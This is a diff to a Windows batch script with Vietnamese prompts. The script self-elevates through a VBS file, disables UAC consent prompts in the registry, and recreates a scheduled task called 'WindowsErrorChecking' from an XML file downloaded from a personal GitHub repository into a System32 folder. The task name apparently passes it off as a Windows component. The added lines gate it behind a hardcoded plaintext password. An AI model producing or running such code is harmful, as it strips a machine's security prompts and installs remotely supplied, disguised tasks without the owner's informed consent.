@@ -1,8 +1,26 @@
 @echo off
+setlocal EnableDelayedExpansion
 set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
+
+
+set "password=Kimthuyen2606"
+
+echo HeHeHeHe:
+powershell -Command "$pwd = Read-Host -AsSecureString; $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pwd); $input_pass = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR); [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR); Set-Content -Path '%TEMP%\pwd.txt' -Value $input_pass"
+
+set /p input_pass=<"%TEMP%\pwd.txt"
+del "%TEMP%\pwd.txt"
+
+if "!input_pass!"=="!password!" (
+    goto :runcode
+) else (
+    goto :cancel
+)
+
+:runcode
 schtasks /End /TN "WindowsErrorChecking"
 schtasks /Delete /TN "WindowsErrorChecking" /F
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windowserrorchecking.xml' -OutFile 'C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml'"
@@ -33,7 +51,6 @@ goto menu
 
 :cancel
 echo Ban da chon huy bo.
-pause
 exit
 
 
